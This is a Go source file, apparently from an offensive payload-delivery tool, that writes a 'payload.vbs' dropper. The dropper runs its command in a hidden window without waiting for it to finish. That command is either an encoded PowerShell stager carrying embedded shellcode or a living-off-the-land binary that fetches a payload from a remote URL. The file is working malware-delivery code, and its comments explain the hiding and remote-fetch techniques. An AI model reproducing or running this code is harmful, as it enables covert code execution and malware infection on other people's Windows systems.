// vbs.go — emit a VBScript (.vbs) run via `cscript //nologo payload.vbs` (or
// `wscript payload.vbs`). Inline mode launches the embedded-shellcode powershell
// stager (`powershell -w hidden -enc <ps1InlineEnc>`); remote mode runs the
// launcher's LOLBin fetch primitive. WScript.Shell.Run's second arg 0 = hidden
// window; third arg False = don't block waiting for the child to exit.
package delivery

import "strings"

type vbsEmitter struct{}

func (vbsEmitter) Name() string { return "vbs" }
func (vbsEmitter) Ext() string  { return "vbs" }

func (vbsEmitter) Emit(s *Spec) ([]Artifact, error) {
	var cmd string
	switch {
	case s.Remote():
		cmd = lolbinRemote(s.Launcher, s.URL)
	case len(s.Shellcode) > 0:
		cmd = launcherInlineCmd(s.Shellcode)
	default:
		return nil, errPayloadRequired("vbs")
	}
	body := vbsBody(cmd)
	return []Artifact{writeFile("payload.vbs", []byte(body))}, nil
}

// vbsBody renders a VBScript that runs `cmd` hidden via WScript.Shell.
func vbsBody(cmd string) string {
	var b strings.Builder
	b.WriteString("' run via: cscript //nologo payload.vbs\n")
	b.WriteString("Set s = CreateObject(\"WScript.Shell\")\n")
	b.WriteString("s.Run \"" + vbsEscape(cmd) + "\", 0, False\n")
	return b.String()
}